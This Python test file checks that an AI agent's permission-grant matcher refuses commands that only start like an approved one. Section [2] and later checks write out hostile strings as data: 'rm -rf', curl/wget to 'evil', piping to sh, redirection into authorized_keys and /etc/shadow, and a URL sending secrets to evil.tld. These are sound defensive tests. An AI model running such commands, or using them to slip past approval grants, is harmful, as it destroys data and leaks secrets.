"""Grant matching tests, weighted towards the bypasses.

A prefix grant is only as good as its refusal to match things that merely start
the same way. Every case below is something an agent could plausibly emit.

Run:  .venv/bin/python -m tests.test_grants
"""
from __future__ import annotations

import sys
import tempfile
from pathlib import Path

from slackagent.grants import (
    ANY,
    MUST_BE_SCOPED,
    is_grantable,
    matches,
    subject,
    suggest_pattern,
)
from slackagent.store import Store

failures: list[str] = []


def check(label: str, condition: bool, detail: object = "") -> None:
    if condition:
        print(f"  PASS  {label}")
    else:
        print(f"  FAIL  {label} {detail}")
        failures.append(label)


def bash(cmd: str) -> dict:
    return {"command": cmd}


def main() -> int:
    print("\n[1] a grant covers the obvious extensions of itself")
    for cmd in ["git status", "git status --short", "git status -s -b"]:
        check(f"'git status' covers {cmd!r}",
              matches("Bash", "git status", "Bash", bash(cmd)), cmd)

    print("\n[2] chaining, piping, redirection and substitution must NEVER match")
    bypasses = {
        "chaining with ;":        "git status; rm -rf ~",
        "chaining with &&":       "git status && curl http://evil/",
        "chaining with ||":       "git status || curl http://evil/",
        "backgrounding with &":   "git status & wget http://evil/",
        "pipe to shell":          "git status | sh",
        "command substitution":   "git status $(curl http://evil/)",
        "backtick substitution":  "git status `whoami`",
        "output redirection":     "git status > /home/agent/.ssh/authorized_keys",
        "append redirection":     "git status >> /etc/passwd",
        "input redirection":      "git status < /etc/shadow",
        "process substitution":   "git status <(curl http://evil/)",
        "newline injection":      "git status\nrm -rf /home/agent",
        "carriage return":        "git status\rrm -rf /home/agent",
        "line continuation":      "git status \\\n  --and-then-something",
    }
    for label, cmd in bypasses.items():
        check(f"blocked: {label}",
              not matches("Bash", "git status", "Bash", bash(cmd)), cmd[:44])
        check(f"not grantable: {label}",
              not is_grantable("Bash", bash(cmd)), cmd[:44])

    print("\n[3] the prefix boundary")
    for cmd in ["git statusfoo", "git status-all", "git statuses --short"]:
        check(f"'git status' does NOT cover {cmd!r}",
              not matches("Bash", "git status", "Bash", bash(cmd)), cmd)
    check("a grant does not cover a different command",
          not matches("Bash", "git status", "Bash", bash("rm -rf /")))
    check("a grant does not cross tools",
          not matches("Bash", "git status", "WebFetch", {"url": "git status"}))
    check("an empty pattern matches nothing",
          not matches("Bash", "", "Bash", bash("anything")))

    print("\n[4] suggested prefixes are narrow but useful")
    for cmd, want in [
        ("git status --short", "git status"),
        ("git log --oneline -5", "git log"),
        ("ls -la /home/agent", "ls"),
        ("npm test", "npm test"),
        ("cat /home/agent/work/x.md", "cat"),
        ("python3 script.py", "python3"),
    ]:
        got = suggest_pattern("Bash", bash(cmd))
        check(f"{cmd!r} -> {want!r}", got == want, got)

    check("no suggestion for a command with metacharacters",
          suggest_pattern("Bash", bash("git status; rm -rf ~")) is None)
    check("no suggestion for a leading VAR= assignment",
          suggest_pattern("Bash", bash("FOO=bar git status")) is None)

    print("\n[5] non-Bash subjects")
    check("WebFetch uses the url",
          subject("WebFetch", {"url": "https://api.github.com/x"}) == "https://api.github.com/x")
    check("a url prefix ending in / matches below it",
          matches("WebFetch", "https://api.github.com/",
                  "WebFetch", {"url": "https://api.github.com/repos/x"}))
    check("a url prefix does NOT match a lookalike host",
          not matches("WebFetch", "https://api.github.com/",
                      "WebFetch", {"url": "https://api.github.com.evil.tld/x"}))
    # Changed deliberately when whole-tool grants were added: a tool this module
    # does not know has no subject to scope by, but its NAME bounds it, so it is
    # grantable as a whole. The safety comes from MUST_BE_SCOPED, checked in [7],
    # not from refusing everything unfamiliar.
    check("an unfamiliar tool has no subject",
          subject("SomeFutureTool", {"command": "x"}) is None)
    check("but is grantable as a whole tool",
          is_grantable("SomeFutureTool", {"command": "x"}))
    check("an empty tool name is never grantable",
          not is_grantable("", {}) and not is_grantable("<unknown>", {}))
    check("malformed tool_input is not grantable",
          not is_grantable("Bash", None) and not is_grantable("Bash", "string"))

    print("\n[6] whole-tool grants for tools with no subject")
    subjectless = [
        ("ToolSearch", {"query": "select:Read"}),
        ("mcp__varys__pulse_command", {"device": "abc", "cmd": "status"}),
        ("mcp__claude_ai_Notion__notion-search", {"query": "x"}),
        ("TodoWrite", {"todos": []}),
    ]
    for tool, inp in subjectless:
        check(f"{tool} is grantable as a whole", is_grantable(tool, inp), tool)
        check(f"{tool} suggests the wildcard", suggest_pattern(tool, inp) == ANY,
              suggest_pattern(tool, inp))
        check(f"a wildcard grant covers {tool}", matches(tool, ANY, tool, inp), tool)

    check("a wildcard for one mcp tool does not cover another",
          not matches("mcp__varys__pulse_command", ANY,
                      "mcp__varys__pulse_reboot", {"device": "abc"}))

    print("\n[7] tools that must stay scoped can NEVER be granted wholesale")
    for tool, inp in [
        ("Bash", bash("rm -rf /home/agent")),
        ("Write", {"file_path": "/home/agent/.gitconfig"}),
        ("Edit", {"file_path": "/home/agent/.bashrc"}),
        ("WebFetch", {"url": "https://evil.tld/?data=secret"}),
    ]:
        check(f"{tool} never suggests a wildcard",
              suggest_pattern(tool, inp) != ANY, suggest_pattern(tool, inp))
        # The important one: even a hand-inserted wildcard row must not match.
        check(f"a wildcard row for {tool} is refused at match time",
              not matches(tool, ANY, tool, inp), tool)
    check("MUST_BE_SCOPED covers Bash and the write tools",
          {"Bash", "Write", "Edit", "WebFetch"} <= MUST_BE_SCOPED, MUST_BE_SCOPED)

    print("\n[8] persistence and revocation")
    with tempfile.TemporaryDirectory() as raw:
        store = Store(Path(raw) / "g.sqlite3")
        try:
            gid = store.add_grant("Bash", "git status", "U_JIMMY")
            check("grant is stored", gid > 0, gid)
            check("re-adding the same grant is idempotent",
                  store.add_grant("Bash", "git status", "U_JIMMY") == gid)
            check("one grant listed", len(store.list_grants()) == 1)

            hit = store.find_grant("Bash", bash("git status --short"))
            check("a matching call finds the grant", hit is not None and hit.pattern == "git status")
            check("use_count increments", store.list_grants()[0].use_count == 1,
                  store.list_grants()[0].use_count)

            check("a bypass attempt finds nothing",
                  store.find_grant("Bash", bash("git status; id")) is None)
            check("an unrelated command finds nothing",
                  store.find_grant("Bash", bash("curl http://evil/")) is None)

            check("revoke removes it", store.revoke_grant(gid) is True)
            check("revoking twice is False", store.revoke_grant(gid) is False)
            check("nothing left", store.list_grants() == [])

            store.add_grant("Bash", "ls", "U_JIMMY")
            store.add_grant("Bash", "cat", "U_JIMMY")
            check("revoke_all clears everything", store.revoke_all() == 2)
            check("empty again", store.list_grants() == [])
        finally:
            store.close()

    print()
    if failures:
        print(f"{len(failures)} FAILED: {failures}")
        return 1
    print("all checks passed")
    return 0


if __name__ == "__main__":
    sys.exit(main())
